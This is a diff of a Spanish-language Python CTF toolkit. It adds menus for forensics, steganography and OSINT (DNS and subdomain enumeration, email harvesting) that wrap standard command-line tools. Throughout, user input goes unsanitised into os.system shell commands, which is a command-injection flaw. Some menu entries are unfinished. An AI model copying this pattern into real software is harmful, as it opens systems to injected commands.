-                if choice == '1':
-                    self.show_injection_menu()
-                elif choice == '2':
-                    self.show_security_menu()
-                elif choice == '3':
-                    self.show_utilities_menu()
-                elif choice == '4':
-                    print("\n¡Éxito en tus retos! ¡Hasta pronto! 👋")
-                    sys.exit(0)
-                else:
-                    print("Opción no válida. Inténtalo de nuevo.")
+                print(f"Entropy: {entropy:.2f} (>7.5 = probablemente encriptado)")
+    except:
+        print("Error calculando entropy")
 
-            except KeyboardInterrupt:
-                print("\n\n¡Herramienta finalizada! ¡Buena suerte! 🚀")
-                sys.exit(0)
-                
-            except Exception as e:
-                print(f"\nOcurrió un error inesperado (Tipo: {type(e).__name__}, Mensaje: {e}).") 
-                input("Presiona ENTER para volver al menú...")
+def forensics_memory_strings(dump_path):
+    """Análisis de memoria dump"""
+    print(f"\n{YELLOW}═══ MEMORY DUMP ANALYSIS ═══{RESET}\n")
+    
+    print("[1/3] Buscando passwords...")
+    os.system(f"strings {dump_path} | grep -i 'password\\|passwd\\|pwd' | head -20")
+    
+    print("\n[2/3] Buscando flags...")
+    os.system(f"strings {dump_path} | grep -E 'flag\\{{|FLAG\\{{' | head -20")
+    
+    print("\n[3/3] Buscando URLs...")
+    os.system(f"strings {dump_path} | grep -E 'http://|https://' | head -20")
 
-def main():
-    assistant = CTFAssistant()
-    assistant.main_menu()
+def forensics_disk_analysis(image_path):
+    """Análisis de imagen de disco"""
+    print(f"\n{YELLOW}═══ DISK IMAGE ANALYSIS ═══{RESET}\n")
+    
+    print("[1/3] Mounting image...")
+    mount_point = "/tmp/disk_mount"
+    os.system(f"mkdir -p {mount_point}")
+    os.system(f"sudo mount -o loop {image_path} {mount_point} 2>/dev/null")
+    
+    print("\n[2/3] Listing files...")
+    os.system(f"ls -laR {mount_point} 2>/dev/null | head -50")
+    
+    print("\n[3/3] Searching for hidden files...")
+    os.system(f"find {mount_point} -name '.*' 2>/dev/null")
+    
+    print(f"\n💾 Image mounted at: {mount_point}")
+    print("Recuerda desmontar: sudo umount {mount_point}")
 
-if __name__ == "__main__":
-    main()
+def forensics_menu():
+    """Menú de Forensics"""
+    while True:
+        print(f"\n{BLUE}{'═'*60}")
+        print("FORENSICS")
+        print(f"{'═'*60}{RESET}")
+        print("1. 🔍 File Analysis (completo)")
+        print("2. 💾 Memory Dump Analysis")
+        print("3. 💿 Disk Image Analysis")
+        print("4. 📦 Extract Embedded Files (binwalk)")
+        print("5. 🖼️  Image Metadata (exiftool)")
+        print("6. 🔎 File Carving (foremost)")
+        print("9. ← Volver")
+        
+        choice = input(f"\n{CYAN}Opción: {RESET}").strip()
+        
+        if choice == '9':
+            break
+        
+        file_path = input("Ruta del archivo: ").strip()
+        
+        if choice == '1':
+            forensics_file_analysis(file_path)
+        elif choice == '2':
+            forensics_memory_strings(file_path)
+        elif choice == '3':
+            forensics_disk_analysis(file_path)
+        elif choice == '4':
+            output = input("Directorio output (default /tmp/binwalk): ").strip() or "/tmp/binwalk"
+            os.system(f"binwalk -e --directory={output} {file_path}")
+            print(f"\n✅ Archivos en: {output}")
+        elif choice == '5':
+            os.system(f"exiftool {file_path}")
+        elif choice == '6':
+            output = input("Directorio output (default /tmp/foremost): ").strip() or "/tmp/foremost"
+            os.system(f"foremost -o {output} {file_path}")
+            print(f"\n✅ Archivos en: {output}")
+
+# ═══════════════════════════════════════════════════════════════
+# MÓDULO 4: STEGANOGRAPHY
+# ═══════════════════════════════════════════════════════════════
+
+def stego_image_analysis(image_path):
+    """Análisis de esteganografía en imágenes"""
+    print(f"\n{YELLOW}═══ IMAGE STEGANOGRAPHY ═══{RESET}\n")
+    
+    print("[1/5] Metadata...")
+    os.system(f"exiftool {image_path} 2>/dev/null")
+    
+    print("\n[2/5] Strings...")
+    os.system(f"strings {image_path} | grep -i flag")
+    
+    print("\n[3/5] Binwalk (embedded files)...")
+    os.system(f"binwalk {image_path}")
+    
+    print("\n[4/5] Steghide extract (sin password)...")
+    os.system(f"steghide extract -sf {image_path} -p '' 2>/dev/null || echo 'Requiere password'")
+    
+    print("\n[5/5] zsteg (LSB analysis)...")
+    os.system(f"zsteg {image_path} 2>/dev/null | head -20")
+
+def stego_audio_analysis(audio_path):
+    """Análisis de audio"""
+    print(f"\n{YELLOW}═══ AUDIO STEGANOGRAPHY ═══{RESET}\n")
+    
+    print("[1/3] Metadata...")
+    os.system(f"exiftool {audio_path} 2>/dev/null")
+    
+    print("\n[2/3] Spectogram analysis...")
+    print("Abriendo en Audacity para análisis visual...")
+    os.system(f"audacity {audio_path} &")
+    
+    print("\n[3/3] Strings...")
+    os.system(f"strings {audio_path} | grep -i flag")
+
+def stego_menu():
+    """Menú de Steganography"""
+    while True:
+        print(f"\n{BLUE}{'═'*60}")
+        print("STEGANOGRAPHY")
+        print(f"{'═'*60}{RESET}")
+        print("1. 🖼️  Image Analysis")
+        print("2. 🎵 Audio Analysis")
+        print("3. 📄 Text/Document Analysis")
+        print("4. 🔓 Steghide Extract")
+        print("5. 🔍 LSB Analysis (zsteg)")
+        print("6. 📊 Stegsolve (tool)")
+        print("9. ← Volver")
+        
+        choice = input(f"\n{CYAN}Opción: {RESET}").strip()
+        
+        if choice == '9':
+            break
+        
+        file_path = input("Ruta del archivo: ").strip()
+        
+        if choice == '1':
+            stego_image_analysis(file_path)
+        elif choice == '2':
+            stego_audio_analysis(file_path)
+        elif choice == '3':
+            os.system(f"strings {file_path} | head -50")
+        elif choice == '4':
+            password = input("Password (Enter si ninguno): ").strip()
+            cmd = f"steghide extract -sf {file_path}"
+            if password:
+                cmd += f" -p {password}"
+            os.system(cmd)
+        elif choice == '5':
+            os.system(f"zsteg {file_path}")
+        elif choice == '6':
+            os.system(f"stegsolve {file_path} &")
+
+# ═══════════════════════════════════════════════════════════════
+# MÓDULO 5: OSINT
+# ═══════════════════════════════════════════════════════════════
+
+def osint_whois(domain):
+    """WHOIS lookup"""
+    print(f"\n{YELLOW}═══ WHOIS LOOKUP ═══{RESET}\n")
+    os.system(f"whois {domain}")
+
+def osint_dns(domain):
+    """DNS enumeration"""
+    print(f"\n{YELLOW}═══ DNS ENUMERATION ═══{RESET}\n")
+    
+    print("[1/4] A records...")
+    os.system(f"dig A {domain} +short")
+    
+    print("\n[2/4] MX records...")
+    os.system(f"dig MX {domain} +short")
+    
+    print("\n[3/4] TXT records...")
+    os.system(f"dig TXT {domain} +short")
+    
+    print("\n[4/4] NS records...")
+    os.system(f"dig NS {domain} +short")
+
+def osint_subdomain_enum(domain):
+    """Enumeración de subdominios"""
+    print(f"\n{YELLOW}═══ SUBDOMAIN ENUMERATION ═══{RESET}\n")
+    
+    print("Usando wordlist offline...")
+    wordlist = "~/CTF_OFFLINE_RESOURCES/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt"
+    
+    if os.path.exists(os.path.expanduser(wordlist)):
+        print(f"Testing common subdomains...")
+        os.system(f"cat {wordlist} | head -100 | while read sub; do "
+                 f"host $sub.{domain} 2>/dev/null | grep 'has address' && echo $sub.{domain}; done")
+    else:
+        print("Wordlist no encontrada, probando comunes...")
+        common = ['www', 'mail', 'ftp', 'admin', 'blog', 'dev', 'api']
+        for sub in common:
+            os.system(f"host {sub}.{domain} 2>/dev/null | grep 'has address'")
+
+def osint_menu():
+    """Menú de OSINT"""
+    while True:
+        print(f"\n{BLUE}{'═'*60}")
+        print("OSINT (Open Source Intelligence)")
+        print(f"{'═'*60}{RESET}")
+        print("1. 🔍 WHOIS Lookup")
+        print("2. 🌐 DNS Enumeration")
+        print("3. 📡 Subdomain Enumeration")
+        print("4. 📧 Email Harvesting")
+        print("5. 🗺️  Geolocation (IP)")
+        print("6. 📸 Social Media Search")
+        print("9. ← Volver")
+        
+        choice = input(f"\n{CYAN}Opción: {RESET}").strip()
+        
+        if choice == '9':
+            break
+        
+        if choice == '1':
+            domain = input("Domain: ").strip()
+            osint_whois(domain)
+        elif choice == '2':
+            domain = input("Domain: ").strip()
+            osint_dns(domain)
+        elif choice == '3':
+            domain = input("Domain: ").strip()
+            osint_subdomain_enum(domain)
+        elif choice == '4':
+            domain = input("Domain: ").strip()
+            print("\nBuscando emails...")
+            os.system(f"theharvester -d {domain} -b google 2>/dev/null || echo 'theHarvester no disponible'")
+        elif choice == '5':
+            ip = input("IP address: ").strip()
+            os.system(f"curl ipinfo.io/{ip} 2>/dev/null")
+
+# ═══════════════════════════════════════════════════════════════
+# MENÚ PRINCIPAL
+# ═══════════════════════════════════════════════════════════════
+
+def main_menu():
+    """Menú principal con todas las categorías"""
+    while True:
+        print(f"\n{GREEN}{'═'*60}")
+        print(" CTF COMPLETE TOOLKIT - Campo de Marte 2025")
+        print(f"{'═'*60}{RESET}")
+        print(f"{MAGENTA}1. 💻 REVERSING{RESET} - Binary analysis, disassembly")
+        print(f"{RED}2. 💥 PWN{RESET} - Binary exploitation, ROP")
+        print(f"{CYAN}3. 🔍 FORENSICS{RESET} - File analysis, memory dumps")
+        print(f"{YELLOW}4. 🖼️  STEGANOGRAPHY{RESET} - Hidden data in files")
+        print(f"{BLUE}5. 🌐 OSINT{RESET} - Open source intelligence")
+        print(f"{GREEN}6. 🌐 WEB{RESET} - SQL injection, XSS, etc")
+        print(f"{MAGENTA}7. 🔧 HARDWARE{RESET} - ESP32, firmware, etc")
+        print(f"{CYAN}8. 🔐 CRYPTO{RESET} - Encoding, hashing, ciphers")
+        print("0. ❌ Salir")
+        
+        choice = input(f"\n{CYAN}Categoría: {RESET}").strip()
+        
+        if choice == '1':
+            reversing_menu()
+        elif choice == '2':
+            pwn_menu()
+        elif choice == '3':
+            forensics_menu()
+        elif choice == '4':
+            stego_menu()
+        elif choice == '5':
+            osint_menu()
+        elif choice == '0':
+            print(f"\n{GREEN}¡Suerte en Campo de Marte 2025!{RESET}\n")
+            break
+
+if __name__ == '__main__':
+    try:
+        main_menu()
+    except KeyboardInterrupt:
+        print(f"\n\n{YELLOW}Saliendo...{RESET}\n")
+        sys.exit(0)
